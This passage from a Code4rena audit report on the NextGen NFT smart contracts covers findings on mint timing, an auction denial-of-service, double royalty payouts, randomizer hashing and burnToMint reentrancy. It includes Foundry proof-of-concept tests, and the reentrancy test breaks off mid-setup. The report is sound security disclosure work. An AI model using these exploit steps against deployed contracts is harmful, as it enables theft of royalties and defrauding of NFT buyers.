The first user's mint will proceed smoothly since `timeOfLastMint` falls within the previous mint period. However, the second user's mint will fail. The same applies to all other whitelisted users. This issue arises due to the [following block](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L252):

```solidity
lastMintDate[col] = collectionPhases[col].allowlistStartTime
                + (collectionPhases[col].timePeriod * (gencore.viewCirSupply(col) - 1));
```

This [calculation](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L252) extends the allowed time significantly, granting the second minter an allowed time of `allowlistStartTime + 1 min * (500-1) = allowlistStartTime + 499 min`, which is equivalent to 8 hours and 19 minutes after `allowlistStartTime`. This enables the second user to mint at **12:19 AM**, long after the whitelist has ended and in the middle of the public sale. And if anyone tries to mint, this call will revert with `underflow` error, as `timeOfLastMint` > `block.timestamp`.

```solidity
uint256 tDiff = (block.timestamp - timeOfLastMint) / collectionPhases[col].timePeriod;
```

It's worth noting that some collections may disrupt the whitelist, while others could brick the entire mint process; especially if there are more minted NFTs or a longer minting period.

### POC

1. Gits - <https://gist.github.com/0x3b33/677f86f30603dfa213541cf764bbc0e8>.
2. Add to remappings - `contracts/=smart-contracts/`.
3. Run it with `forge test --match-test test_multipleMints --lib-paths ../smart-contracts`.

### Recommended Mitigation Steps

For this fix, I am unable to give any suggestion as big parts of the protocol need to be redone. I can only point out the root cause of the problem, which is `(gencore.viewCirSupply(col) - 1)` in the [snippet below](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L252).

```solidity
lastMintDate[col] = collectionPhases[col].allowlistStartTime + (collectionPhases[col].timePeriod * (gencore.viewCirSupply(col) - 1));
```

### Assessed type

Error

**[a2rocket (NextGen) confirmed](https://github.com/code-423n4/2023-10-nextgen-findings/issues/380#issuecomment-1824060567)**

**[0xsomeone (judge) increased severity to High and commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/380#issuecomment-1845252426):**
 > The Warden's submission was selected as the best given that it illustrates the problem by citing the relevant documentation of the project, contains a valid PoC, and acknowledges the difficulty in rectifying this issue. While the submission has under-estimated the issue's severity, the relevant high-severity issues ([#2012](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2012), [#1123](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1123), [#939](https://github.com/code-423n4/2023-10-nextgen-findings/issues/939), [#632](https://github.com/code-423n4/2023-10-nextgen-findings/issues/632), [#631](https://github.com/code-423n4/2023-10-nextgen-findings/issues/631), [#89](https://github.com/code-423n4/2023-10-nextgen-findings/issues/89)) were not of sufficient quality and the best candidate ([#1123](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1123)) minimizes the issue's applicability and does not advise a proper recommendation either.
> 
> To alleviate the issue, the Sponsor is advised to implement a "start date" for the periodic sales that is reconfigured whenever a periodic sale is re-instated. This would permit the `lastMintDate` calculations to "restart" the date from which periodic sale allowances should be tracked and also allow the code to snapshot the circulating supply at the time the first periodic sale occurs **of each independent periodic sale phase**. As the Warden correctly assessed, a viable solution to this vulnerability is difficult to implement.

***

## [H-05] Permanent DoS due to non-shrinking array usage in an unbounded loop

*Submitted by [Hound](https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a#h-01-permanent-dos-due-to-non-shrinking-array-usage-in-an-unbounded-loop)*

*Note: this finding was reported via the winning [Automated Findings report](https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a). It was declared out of scope for the audit, but is being included here for completeness.*

There are some arrays that can grow indefinitely in size, as they never shrink. When these arrays are used in unbounded loops, they may lead to a permanent denial-of-service (DoS) of these functions.

### POC

1. Attacker calls `participateToAuction` N times with dust amounts until `returnHighestBid` reverts (out of gas).
2. When `claimAuction` is called by `WinnerOrAdminRequired`, the transaction will fail, as it calls `returnHighestBid`. As a result, `claimAuction` will be permanently DoS.

*There are 4 instances of this issue:*

[[69](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L69), [90](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L90), [110](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L110), [136](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L136)]

```solidity
File: smart-contracts/AuctionDemo.sol

// @audit function returnHighestBid is vulnerable as length grows in size but never shrinks
69: 		            for (uint256 i=0; i< auctionInfoData[_tokenid].length; i++) {

60: 		        auctionInfoData[_tokenid].push(newBid);

// @audit function returnHighestBidder is vulnerable as length grows in size but never shrinks
90: 		        for (uint256 i=0; i< auctionInfoData[_tokenid].length; i++) {

60: 		        auctionInfoData[_tokenid].push(newBid);

// @audit function claimAuction is vulnerable as length grows in size but never shrinks
110: 		        for (uint256 i=0; i< auctionInfoData[_tokenid].length; i ++) {

60: 		        auctionInfoData[_tokenid].push(newBid);

// @audit function cancelAllBids is vulnerable as length grows in size but never shrinks
136: 		        for (uint256 i=0; i<auctionInfoData[_tokenid].length; i++) {

60: 		        auctionInfoData[_tokenid].push(newBid);
```

**[a2rocket (NextGen) confirmed](https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a?permalink_comment_id=4797585#gistcomment-4797585)**

**[0xsomeone (judge) commented](https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a?permalink_comment_id=4797627#gistcomment-4797627):**
> Important and valid.

***

# Medium Risk Findings (12)

## [[M-01] `MinterContract::payArtist` can result in double the intended payout](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1686)
*Submitted by [immeas](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1686), also found by [btk](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1550), [dy](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1419), [7siech](https://github.com/code-423n4/2023-10-nextgen-findings/issues/606), and [Myd](https://github.com/code-423n4/2023-10-nextgen-findings/issues/325)*

The royalty allocation within the protocol works like this:

First, an admin sets the split between team and artist. Here it is validated that the artist and team allocations together fill up 100%:

[`MinterContract::setPrimaryAndSecondarySplits`](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L369-L376):

```solidity
File: smart-contracts/MinterContract.sol

369:    function setPrimaryAndSecondarySplits(uint256 _collectionID, uint256 _artistPrSplit, uint256 _teamPrSplit, uint256 _artistSecSplit, uint256 _teamSecSplit) public FunctionAdminRequired(this.setPrimaryAndSecondarySplits.selector) {
370:        require(_artistPrSplit + _teamPrSplit == 100, "splits need to be 100%");
371:        require(_artistSecSplit + _teamSecSplit == 100, "splits need to be 100%");
372:        collectionRoyaltiesPrimarySplits[_collectionID].artistPercentage = _artistPrSplit;
373:        collectionRoyaltiesPrimarySplits[_collectionID].teamPercentage = _teamPrSplit;
374:        collectionRoyaltiesSecondarySplits[_collectionID].artistPercentage = _artistSecSplit;
375:        collectionRoyaltiesSecondarySplits[_collectionID].teamPercentage = _teamSecSplit;
376:    }
```

The artist can then propose a split between artist addresses, where it is validated that the different artist addresses together add up to the total artist allocation:

[`MinterContract::proposePrimaryAddressesAndPercentages`](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L380-L382):

```solidity
File: smart-contracts/MinterContract.sol

380:    function proposePrimaryAddressesAndPercentages(uint256 _collectionID, address _primaryAdd1, address _primaryAdd2, address _primaryAdd3, uint256 _add1Percentage, uint256 _add2Percentage, uint256 _add3Percentage) public ArtistOrAdminRequired(_collectionID, this.proposePrimaryAddressesAndPercentages.selector) {
381:        require (collectionArtistPrimaryAddresses[_collectionID].status == false, "Already approved");
382:        require (_add1Percentage + _add2Percentage + _add3Percentage == collectionRoyaltiesPrimarySplits[_collectionID].artistPercentage, "Check %");
```

Then, also when paid out, there is a validation that the split between team and artist allocation adds up:

[`MinterContract::payArtist`](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L415-L418):

```solidity
File: smart-contracts/MinterContract.sol

415:    function payArtist(uint256 _collectionID, address _team1, address _team2, uint256 _teamperc1, uint256 _teamperc2) public FunctionAdminRequired(this.payArtist.selector) {
416:        require(collectionArtistPrimaryAddresses[_collectionID].status == true, "Accept Royalties");
417:        require(collectionTotalAmount[_collectionID] > 0, "Collection Balance must be greater than 0");
418:        require(collectionRoyaltiesPrimarySplits[_collectionID].artistPercentage + _teamperc1 + _teamperc2 == 100, "Change percentages");
```

The issue is that here, it compares to the artist allocation from artist/team allocations. When the actual amount paid out is calculated, it uses the proposed (and accepted) artist address percentages:

[`MinterContract::payArtist`](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L429-L431):

```solidity
File: smart-contracts/MinterContract.sol

429:        artistRoyalties1 = royalties * collectionArtistPrimaryAddresses[colId].add1Percentage / 100;
430:        artistRoyalties2 = royalties * collectionArtistPrimaryAddresses[colId].add2Percentage / 100;
431:        artistRoyalties3 = royalties * collectionArtistPrimaryAddresses[colId].add3Percentage / 100;
```

Hence, there is a possibility that up to double the intended amount can be paid out, imagine this scenario:

1. An admin sets artist/team allocation to 100% artist, 0% team.
2. Artist proposes a split between addresses (for the total 100%), which is accepted.
3. Admin then changes the allocation to 0% artist, 100% team.

They then call `payArtist` with the 100% team allocation. This will pass the check as `artistPercentage` will be `0`. However, the artist payouts will use the already proposed artist address allocations. Hence, double the amount will be paid out.

### Impact

An admin can maliciously, or by mistake, manipulate the percentage allocation for a collections royalty to pay out up to double the amount of royalty. This could make it impossible to payout royalty later, as this steals royalty from other collections.

### Proof of Concept

PoC using foundry. Save file in `hardhat/test/MinterContractTest.t.sol`, also needs `forge-std` in `hardhat/lib`:

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.19;

import {Test} from "../lib/forge-std/src/Test.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";
import {NextGenAdmins} from "../smart-contracts/NextGenAdmins.sol";
import {INextGenCore} from "../smart-contracts/INextGenCore.sol";

contract MinterContractTest is Test {
  
  uint256 constant colId = 1;
  
  address team = makeAddr('team');
  address artist = makeAddr('artist');

  address core  = makeAddr('core');
  address delegate = makeAddr('delegate');

  NextGenAdmins admin = new NextGenAdmins();
  NextGenMinterContract minter;

  function setUp() public {
    minter = new NextGenMinterContract(core, delegate, address(admin));

    vm.mockCall(core, abi.encodeWithSelector(INextGenCore.retrievewereDataAdded.selector), abi.encode(true));
    vm.mockCall(core, abi.encodeWithSelector(INextGenCore.viewMaxAllowance.selector), abi.encode(1));
    vm.mockCall(core, abi.encodeWithSelector(INextGenCore.retrieveTokensMintedPublicPerAddress.selector), abi.encode(0));
    vm.mockCall(core, abi.encodeWithSelector(INextGenCore.viewTokensIndexMin.selector), abi.encode(1));
    vm.mockCall(core, abi.encodeWithSelector(INextGenCore.viewCirSupply.selector), abi.encode(0));
    vm.mockCall(core, abi.encodeWithSelector(INextGenCore.viewTokensIndexMax.selector), abi.encode(1_000));
    vm.mockCall(core, abi.encodeWithSelector(INextGenCore.retrieveArtistAddress.selector), abi.encode(artist));
    vm.mockCall(core, abi.encodeWithSelector(INextGenCore.mint.selector), new bytes(0));

    minter.setCollectionCosts(colId, 1 ether, 1 ether, 0, 100, 0, address(0));
    minter.setCollectionPhases(colId, 0, 0, 1, 101, bytes32(0));

    vm.warp(1); // jump one sec to enter public phase
  }

  function testFaultySplitResultsInDoubleRoyalty() public {
    // needs to hold one extra eth for payout
    vm.deal(address(minter),1 ether);

    // mint to increase collectionTotalAmount
    minter.mint{value: 1 ether}(colId, 1, 1, '', address(this), new bytes32[](0), address(0), 0);
    assertEq(2 ether, address(minter).balance);

    // begin with setting artist split to 100%, team 0%
    minter.setPrimaryAndSecondarySplits(colId,
      100, 0, // primary
      100, 0  // secondary (not used)
    );

    // set the actual artist split
    minter.proposePrimaryAddressesAndPercentages(colId,
      artist, address(0), address(0),
      100, 0, 0
    );
    minter.acceptAddressesAndPercentages(colId, true, true);

    // set 100% to team, 0% to artist without changing artist address allocation
    minter.setPrimaryAndSecondarySplits(colId,
      0, 100, // primary
      0, 100  // secondary (not used)
    );

    // when artist is paid, 2x the amount is paid out
    minter.payArtist(colId, team, address(0), 100, 0);

    // team gets 1 eth
    assertEq(1 ether, team.balance);
    // artist gets 1 eth
    assertEq(1 ether, artist.balance);
  }
}
```

### Recommended Mitigation Steps

Consider verifying that the artist allocations add up to the artist percentage when calling `payArtist`.

### Assessed type

Invalid Validation

**[a2rocket (NextGen) disputed and commented via duplicate issue #1550](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1550#issuecomment-1825358289)**:
> The `payArtist` function allows to payments to artists between phases. Once a payment is made, the `collectionAmount` goes to `0` and then increases while the second minting starts, etc.

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1686#issuecomment-1839570965):**
 > The Warden specifies that an overpayment of artist funds can be performed, resulting in fund loss for the system if the artist's percentage is ever reduced after having been configured.
> 
> The submission is correct and the core flaw lies in that the `MinterContract::payArtist` function will utilize the **proposed percentages** instead of the accepted ones when performing the transfers, **incorrectly assuming that they equal the `collectionRoyaltiesPrimarySplits[_collectionID].artistPercentage` originally enforced when they were set**.
> 
> The Warden's submission was selected as the best because it details the attack vector precisely, it includes an informative PoC, and provides an easy-to-follow textual description of the issue.
> 
> I consider this to be a valid medium-severity issue as the fund loss can tap into the funds of other users and potentially the teams themselves given that the royalties for artists are distributed before the royalties for teams.

**[MrPotatoMagic (warden) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1686#issuecomment-1848617783):**
 > @0xsomeone, here is why I believe this issue in not valid:
> 
> 1. The issue assumes there will be a deviation from the original process of how royalties are set. That is, `setPrimaryAndSecondarySplits() => proposePrimaryAddressesAndPercentages() => acceptAddressesAndPercentages`.
> 2. The warden mentions that the admin would be malicious or could input by mistake. Such instances are considered reckless admin mistakes as per the [C4 SC verdict in the docs](https://docs.code4rena.com/awarding/judging-criteria/supreme-court-decisions-fall-2023#verdict-severity-standardization-centralization-risks).
> 3. There is no incorrect assumption being made by the NextGen team here since the process mentioned in point 1 is to be followed every time royalties are changed. [See Discord comment by sponsor](https://discord.com/channels/810916927919620096/1166760088963383336/1169637770155786271).

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1686#issuecomment-1848651047):**
 > @MrPotatoMagic, thanks for contributing to this particular submission's Post-Judging QA process! Let me get back to each of your points:
> 
> 1. The issue assumes that the artist is willing to break the flow which is a valid assessment.
> 2. The Warden's submission does not rely on an egregious error or reckless mistake. It also does not rely on their input being incorrect maliciously as any update to the function will cause the bug to manifest at varying degrees. Invoking `setPrimaryAndSecondarySplits`, as its name implies, should overwrite the split percentages but it does not. This is a reasonable expectation of the function. 
> 3. The submission entails incorrect accounting in the `MinterContract`, rather than an administrative error. Additionally, its impact is significant, as it can touch into the funds of other collections as all funds are stored under a single contract.
> 
> Combining the facts that this is a **critical vulnerability** with an **acceptable chance of happening**, I consider a medium-risk rating appropriate for it.
> 
> Keep in mind that the `payArtist` function, while an administrative function, can be assigned to function-level administrators. Contrary to functions like `emergencyWithdraw` which clearly denote their purpose, the NextGen team will never reasonably expect that `payArtist` **can result in the contract's funds being siphoned**.
> 
> As such, the accounting flaw must be corrected and constitutes a medium-risk vulnerability that should be rectified. 

***

## [[M-02] The `RandomizerVRF` and `RandomizerRNG` do not produce hash value.](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1627)
*Submitted by [Haipls](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1627), also found by [Udsen](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1757), [PetarTolev](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1688), [r0ck3tz](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1349), [VAD37](https://github.com/code-423n4/2023-10-nextgen-findings/issues/852), [gumgumzum](https://github.com/code-423n4/2023-10-nextgen-findings/issues/816), [Draiakoo](https://github.com/code-423n4/2023-10-nextgen-findings/issues/218), [ast3ros](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1606), and [00xSEV](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1181)*

According to documentation and other randomizer implementations, Randomizers are expected to set a random `HASH` for the minted tokens.

However, the implementation mistakenly uses bytes32 in the format:

- `bytes32(abi.encodePacked(numbers, requestToToken[id])` or
- `bytes32(abi.encodePacked(_randomWords, requestToToken[_requestId]))`.

```js
File: 2023-10-nextgen\smart-contracts\RandomizerVRF.sol
65:     function fulfillRandomWords(uint256 _requestId, uint256[] memory _randomWords) internal override {
66:         gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[_requestId]], requestToToken[_requestId], bytes32(abi.encodePacked(_randomWords,requestToToken[_requestId])));
67:         emit RequestFulfilled(_requestId, _randomWords);
68:     }
69: 

File: 2023-10-nextgen\smart-contracts\RandomizerRNG.sol
48:     function fulfillRandomWords(uint256 id, uint256[] memory numbers) internal override {
49:         gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[id]], requestToToken[id], bytes32(abi.encodePacked(numbers, requestToToken[id])));
50:     }
```

The hash is calculated as `bytes32` from `abi.encodePacked` of the `random number` and `tokenId`.

Key observations:

1. `bytes32` truncates the result of `abi.encodePacked(numbers, requestToToken[id]`) and *only considers the first element of the random numbers array*.
2. The random number is directly passed to `setTokenHash`. *It is not a hash*, and the second parameter meant to contribute to the hash creation is ignored.
3. Now, the token's hash is directly dependent on the provided number.

Thus, these contracts only pass the random number instead of generating a hash value.

### Proof of Concept

- <https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerVRF.sol#L66>
-  <https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerRNG.sol#L49>

### Description

Example:

If `_randomWords = [1, 2]` and `requestToToken = 1000`,
the result will be `0x0000000000000000000000000000000000000000000000000000000000000001`, which equals only the first provided random number.

```js
File: 2023-10-nextgen\smart-contracts\RandomizerVRF.sol
65:     function fulfillRandomWords(uint256 _requestId, uint256[] memory _randomWords) internal override {
66:         gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[_requestId]], requestToToken[_requestId], bytes32(abi.encodePacked(_randomWords,requestToToken[_requestId])));
67:         emit RequestFulfilled(_requestId, _randomWords);
68:     }
69: 

File: 2023-10-nextgen\smart-contracts\RandomizerRNG.sol
48:     function fulfillRandomWords(uint256 id, uint256[] memory numbers) internal override {
49:         gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[id]], requestToToken[id], bytes32(abi.encodePacked(numbers, requestToToken[id])));
50:     }
```

### Tools Used

HardHat

### Recommended Mitigation Steps

At a minimum, calculate the hash from the provided data using `keccak256`.

```diff
File: 2023-10-nextgen\smart-contracts\RandomizerVRF.sol
65:     function fulfillRandomWords(uint256 _requestId, uint256[] memory _randomWords) internal override {
-66:         gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[_requestId]], requestToToken[_requestId], bytes32(abi.encodePacked(_randomWords,requestToToken[_requestId])));
+66:         gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[_requestId]], requestToToken[_requestId], keccak256(abi.encodePacked(_randomWords,requestToToken[_requestId])));
67:         emit RequestFulfilled(_requestId, _randomWords);
68:     }
69: 

File: 2023-10-nextgen\smart-contracts\RandomizerRNG.sol
48:     function fulfillRandomWords(uint256 id, uint256[] memory numbers) internal override {
-49:         gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[id]], requestToToken[id], bytes32(abi.encodePacked(numbers, requestToToken[id])));
+49:         gencoreContract.setTokenHash(tokenIdToCollection[requestToToken[id]], requestToToken[id], keccak256(abi.encodePacked(numbers, requestToToken[id])));

50:     }
```

This change will ensure compliance with documentation and consider all data involved in the hash creation process.

**[a2rocket (NextGen) confirmed via duplicate issue #1688](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1688#issuecomment-1823861588)**

**[aslanbek (warden) commented via duplicate issue #1688](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1688#issuecomment-1848332019):**
> I believe this report contradicts itself: 
>
> The [RandomizerVRF](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerVRF.sol) and [RandomizerRNG](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerRNG.sol) contracts will not return random hashes, instead, they will only return the generated random number.
>
> This results in non-unique/duplicated tokenHash values and non-randomly generated NFTs. How can two random numbers not being hashed result in non-randomly generated NFTs?
>
> There's indeed a discrepancy between the spec and implementation, but not fixing the issue will simply result in tokens having a random `tokenToHash` anyway, which is sufficient for correct functioning of the protocol. 

**[d3e4 (warden) commented via duplicate issue #1688](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1688#issuecomment-1848368235):**
> Only one random number is requested, so nothing is trimmed away. Hashing a random `256-bit` value does not make it any more random, it is just an arbitrary bijection. A random number and a hash digest (of an unknown or random number) are equivalent. It is randomness that is sought, not the output of specifically a hash function.

**[0xsomeone (judge) commented via duplicate issue #1688](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1688#issuecomment-1848416930):**
> @aslanbek and @d3e4, thanks for your feedback! Let me address both of your points:
>
> **Report Contradiction** - Indeed the report contradicts itself, however, it was the sole submission of this issue and as such is the primary one. 
>
>**Randomness Impact** - A value not being hashed does not impact its randomness, however, it does impact the range the values will be present in. As such, it allows the "expansion" of a randomness range to cover the full `uint256` value range. For example, if the randomness values are in a sub-range `[X,Y]`, the randomness oracles will produce token IDs solely in that range. 
>
> If a hash function is utilized (such as `keccak256`), the range will be expanded to `[0, type(uint256).max]` which is the desirable outcome. This is further illustrated by the fact that the `tokenHash` entry specifies it should be a hash.
>
>**ARRNG-Specific Impact** - Another important trait of hashing is the minimization of monobit bias. A monobit bias occurs when a single bit in the randomness output is more frequently `0` or `1` in relation to the rest of the bits. This is especially prevalent in random sources such as ARRNG which rely on radio waves and other real-world data that may bias their measurements.
>
> A hash will induce the avalanche effect whereby a bit will have a rough chance of being flipped. As such, monobit bias is somewhat eliminated by using hashing functions. While I won't criticize Chainlink, the ARRNG service relies on `RANDOM.ORG` which provides publicly accessible data showcasing its monobit bias.
>
> **Chainlink-Specific Impact** - The Chainlink oracle of NextGen is defined to have the `numWords` requested as updateable. This is very useful when the perceived entropy of random numbers is small; specifically, a hash of multiple lower-than-maximum (`256` in this case) entropy numbers will "compress" the entropy (with some loss of course) into 32 bytes. As an example, hashing two numbers with `16` and `19` bits of entropy each will produce an output that has their entropy combined minus one to account for entropy lost due to compression and collisions.
> 
> As the `numWords` variable can be updated, we can see a problem in the codebase whereby any value of `numWords` greater than one will not increase the entropy of the randomness generator as expected. 
> 
> **Closing Thought** - Given that the code contains an egregious error that directly impacts its functionality, I will maintain the current medium risk rating. The `tokenHash` mapping is expected to contain a hash, and assigning it otherwise is an invariant that is broken. I will consider inviting other judges to contribute to this particular judgment. 

*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1688).*

***

## [[M-03] Vulnerability in `burnToMint` function allows double use of NFT](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1597)
*Submitted by [ast3ros](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1597), also found by [smiling\_heretic](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1533), [bart1e](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1227), [Jiamin](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1198), [Al-Qa-qa](https://github.com/code-423n4/2023-10-nextgen-findings/issues/694), [Ruhum](https://github.com/code-423n4/2023-10-nextgen-findings/issues/571), [ustas](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2052), [rishabh](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2022), [CaeraDenoir](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1988), [00xSEV](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1199), [circlelooper](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1039), [gumgumzum](https://github.com/code-423n4/2023-10-nextgen-findings/issues/949), [crunch](https://github.com/code-423n4/2023-10-nextgen-findings/issues/778), and [Juntao](https://github.com/code-423n4/2023-10-nextgen-findings/issues/527)*

The current implementation of the `burnToMint` function in the `NextGenCore.sol` smart contract permits a contract holder to both burn and sell the same NFT, effectively exploiting it to mint a new NFT. This leads to potential fraudulent activities when trading the NFT.

### Proof of Concept

The vulnerability stems from the order of operations in the `burnToMint` function. Currently, a new token is minted (`_mintProcessing`) before the existing token is burned (`_burn`). This sequence of operations opens a window for exploitation:

```javascript
File: smart-contracts/NextGenCore.sol
213:     function burnToMint(uint256 mintIndex, uint256 _burnCollectionID, uint256 _tokenId, uint256 _mintCollectionID, uint256 _saltfun_o, address burner) external {
214:         require(msg.sender == minterContract, "Caller is not the Minter Contract");
215:         require(_isApprovedOrOwner(burner, _tokenId), "ERC721: caller is not token owner or approved");
216:         collectionAdditionalData[_mintCollectionID].collectionCirculationSupply = collectionAdditionalData[_mintCollectionID].collectionCirculationSupply + 1;
217:         if (collectionAdditionalData[_mintCollectionID].collectionTotalSupply >= collectionAdditionalData[_mintCollectionID].collectionCirculationSupply) {
218:             _mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);
219:             // burn token
220:             _burn(_tokenId);
221:             burnAmount[_burnCollectionID] = burnAmount[_burnCollectionID] + 1;
222:         }
223:     }
```

<https://github.com/code-423n4/2023-10-nextgen/blob/58090c9fbc036c06bbaa9600ec326034f2181a17/hardhat/smart-contracts/NextGenCore.sol#L213-L223>

The `_mintProcessing` function calls `_safeMint`, which in turn can trigger arbitrary code execution if the recipient is a contract. This allows for manipulation such as transferring the NFT (set to be burned) to another user before the burn occurs:

```javascript
File: smart-contracts/NextGenCore.sol
227:     function _mintProcessing(uint256 _mintIndex, address _recipient, string memory _tokenData, uint256 _collectionID, uint256 _saltfun_o) internal {
228:         tokenData[_mintIndex] = _tokenData;
229:         collectionAdditionalData[_collectionID].randomizer.calculateTokenHash(_collectionID, _mintIndex, _saltfun_o);
230:         tokenIdsToCollectionIds[_mintIndex] = _collectionID;
231:         _safeMint(_recipient, _mintIndex);
232:     }
```

<https://github.com/code-423n4/2023-10-nextgen/blob/58090c9fbc036c06bbaa9600ec326034f2181a17/hardhat/smart-contracts/NextGenCore.sol#L227-L232>

A malicious actor can exploit this by listing the NFT for sale. When there is a buy offer, the malicious contract can call `burnToMint` to receive the new NFT and simultaneously accept an offer to buy the original NFT, resulting in the original NFT being burned but still sold, effectively duping the buyer.

In this POC scenario, there are two collections; 1 and 2. The admin is set so that users can burn token in collection 1 to mint token in collection 2.

- A malicious contract has the token `10000000000` of collection 1, it lists the token `10000000000` in the marketplace.
- `addr3` offers to buy the token `10000000000` from the malicious contract.
- The malicious contract calls `burnToMint`, stimulously receives token `20000000000` from collection 2 and accepts the offer to buy `10000000000` from `addr3`.
- In the end, token `10000000000` is burnt and `addr3` receives nothing. The malicious contract receives both token `20000000000` from `burnToMint` and proceed from the sales of token `10000000000`.

POC:

- Save the code in `test/nextGen.test.sol`
- Setup foundry and Run: forge test `-vvvvv --match-contract NextGenCoreTest --match-test testBurnToMintReentrancy`

<details>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../smart-contracts/NextGenCore.sol";
import "../smart-contracts/NextGenAdmins.sol";
import "../smart-contracts/NFTdelegation.sol";
import "../smart-contracts/XRandoms.sol";
import "../smart-contracts/RandomizerNXT.sol";
import "../smart-contracts/MinterContract.sol";
import "../smart-contracts/AuctionDemo.sol";
import "../smart-contracts/IERC721Receiver.sol";
import {console} from "forge-std/console.sol";

contract NextGenCoreTest is Test {
    NextGenCore hhCore;
    DelegationManagementContract hhDelegation;
    randomPool hhRandoms;
    NextGenAdmins hhAdmin;
    NextGenRandomizerNXT hhRandomizer;
    NextGenMinterContract hhMinter;
    auctionDemo hhAuctionDemo;

    address owner;
    address addr1;
    address addr2;
    address addr3;

    function setUp() public {
        owner = address(this);
        addr1 = vm.addr(1);
        addr2 = vm.addr(2);
        addr3 = vm.addr(3);

        // Deploy contracts
        hhDelegation = new DelegationManagementContract();
        hhRandoms = new randomPool();
        hhAdmin = new NextGenAdmins();
        hhCore = new NextGenCore("Next Gen Core", "NEXTGEN", address(hhAdmin));
        hhRandomizer = new NextGenRandomizerNXT(
            address(hhRandoms),
            address(hhAdmin),
            address(hhCore)
        );
        hhMinter = new NextGenMinterContract(
            address(hhCore),
            address(hhDelegation),
            address(hhAdmin)
        );
    }

        function testBurnToMintReentrancy() public {

        // Setting up, creating 2 collections for burnToMint
        string[] memory collectionScript = new string[](1);
        collectionScript[0] = "desc";

        hhCore.createCollection(
            "Test Collection 1",
            "Artist 1",
            "For testing",
            "www.test.com",
            "CCO",
            "https://ipfs.io/ipfs/hash/",
            "",
            collectionScript
        );

        hhCore.createCollection(
            "Test Collection 2",
            "Artist 2",
            "For testing",
            "www.test.com",
            "CCO",
            "https://ipfs.io/ipfs/hash/",
            "",
            collectionScript
        );

        hhAdmin.registerCollectionAdmin(1, address(addr1), true);
        hhAdmin.registerCollectionAdmin(1, address(addr2), true);

        vm.prank(addr1);
        hhCore.setCollectionData(
            1, // _collectionID
            address(addr1), // _collectionArtistAddress
            2, // _maxCollectionPurchases
            10000, // _collectionTotalSupply
